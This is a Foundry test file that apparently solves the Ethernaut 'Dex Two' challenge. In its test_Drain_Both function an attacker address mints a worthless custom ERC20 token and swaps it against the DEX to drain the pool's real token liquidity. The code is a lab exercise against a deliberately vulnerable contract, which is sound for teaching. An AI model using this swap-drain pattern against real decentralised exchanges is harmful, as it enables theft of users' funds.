// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../src/Dex2.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract DexTwoTest is Test {
    SwappableTokenTwo public swappabletoken1;
    SwappableTokenTwo public swappabletoken2;
    RandomTokenA public randomTokenA;
    RandomTokenB public randomTokenB;

    DexTwo public dexTwo;
    address attacker = makeAddr("attacker");

    function setUp() public {
        dexTwo = new DexTwo();
        swappabletoken1 = new SwappableTokenTwo(
            address(dexTwo),
            "Swap",
            "SW",
            100 ether
        );
        vm.label(address(swappabletoken1), "Token 1");
        swappabletoken2 = new SwappableTokenTwo(
            address(dexTwo),
            "Swap",
            "SW",
            100 ether
        );
        vm.label(address(swappabletoken2), "Token 2");
        dexTwo.setTokens(address(swappabletoken1), address(swappabletoken2));

        dexTwo.approve(address(dexTwo), 100 ether);
        dexTwo.add_liquidity(address(swappabletoken1), 100 ether);
        dexTwo.add_liquidity(address(swappabletoken2), 100 ether);
    }

    function test_Drain_Both() public {
        vm.startPrank(attacker);
        randomTokenA = new RandomTokenA("Random A", "RA");
        randomTokenA.mint(attacker, 100 ether);
        randomTokenA.mint(address(dexTwo), 100 ether);

        randomTokenA.approve(address(dexTwo), 100 ether);
        dexTwo.swap(address(randomTokenA), address(swappabletoken1), 100 ether);

        randomTokenA.mint(attacker, 100 ether);
        randomTokenA.mint(address(dexTwo), 100 ether);

        randomTokenA.approve(address(dexTwo), 100 ether);
        dexTwo.swap(address(randomTokenA), address(swappabletoken2), 100 ether);
        vm.stopPrank();
        assert(swappabletoken1.balanceOf(address(dexTwo)) == 0);
    }
}

contract RandomTokenA is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}

contract RandomTokenB is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function mint(address to, uint256 amount) public {
        _mint(to, amount);
    }
}
